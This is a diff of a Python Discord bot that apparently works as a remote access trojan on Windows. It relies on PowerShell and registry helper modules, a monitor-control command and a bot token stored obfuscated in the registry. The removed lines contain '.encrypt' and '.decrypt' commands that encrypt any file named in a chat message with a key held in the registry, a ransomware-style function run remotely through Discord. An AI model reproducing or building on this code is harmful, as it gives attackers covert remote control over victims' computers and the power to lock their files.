@@ -4,10 +4,7 @@ import libs.computer as pc
 import libs.powershell as pw
 import libs.registry_handler as reg_h
 import libs.files as files
-import sys
 from shutil import copy;
-import winshell
-from win32com.client import Dispatch
 import base64
 import gzip
 
@@ -444,30 +441,6 @@ async def on_message(message):
         except Exception as e:
             print(e)
             embed = discord.Embed(title="Monitor Control", description="Failed to channge monitor state.", color=0x00ff00)
-        await message.channel.send(embed=embed)
-    
-    #ENCRYPT
-    if message.content.startswith(".encrypt"):
-        await message.delete()
-        try:
-            file_path = message.content.replace(".encrypt ", "")
-            files.encrypt_file(file_path, reg_h.get_enc_key(), reg_h.get_iv())
-            embed = discord.Embed(title="Encryption", description="File encrypted.", color=0x00ff00)
-        except Exception as e:
-            print(e)
-            embed = discord.Embed(title="Encryption", description="Failed to encrypt file.", color=0x00ff00)
-        await message.channel.send(embed=embed)
-
-    #DECRYPT
-    if message.content.startswith(".decrypt"):
-        await message.delete()
-        try:
-            file_path = message.content.replace(".decrypt ", "")
-            files.decrypt_file(file_path, reg_h.get_enc_key(), reg_h.get_iv())
-            embed = discord.Embed(title="Decryption", description="File decrypted.", color=0x00ff00)
-        except Exception as e:
-            print(e)
-            embed = discord.Embed(title="Decryption", description="Failed to decrypt file.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
